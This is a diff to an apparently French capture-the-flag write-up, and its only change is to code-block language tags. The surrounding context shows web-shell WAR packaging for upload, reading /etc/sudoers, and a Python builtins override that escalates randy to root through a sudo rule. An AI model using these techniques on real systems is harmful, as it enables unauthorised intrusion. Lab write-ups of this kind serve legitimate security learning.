@@ -132,7 +132,7 @@ Dès lors on peut uploader un shell au format WAR. Je n'avais pas envie de lance
 
 L'archiveur jar n'était pas présent sur ma machine mais j'ai trouvé un petit paquet *fastjar* pour ma distrib openSUSE (*zypper in fastjar*).  
 
-```bash
+```console
 $ mkdir webshell
 $ cp index.jsp webshell
 $ cd webshell
@@ -257,7 +257,7 @@ $ python3 /tmp/test.py /root/root.txt
 
 On voit que *randy* peut lancer son script Python en tant que *root* :  
 
-```bash
+```console
 $ python3 /tmp/test.py /etc/sudoers
 root    ALL=(ALL:ALL) ALL
 randy ALL=(root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
@@ -314,7 +314,7 @@ def input(s):
 __builtins__["input"] = input
 ```
 
-```
+```console
 randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
 Enter your string: id
 uid=0(root) gid=0(root) groups=0(root)
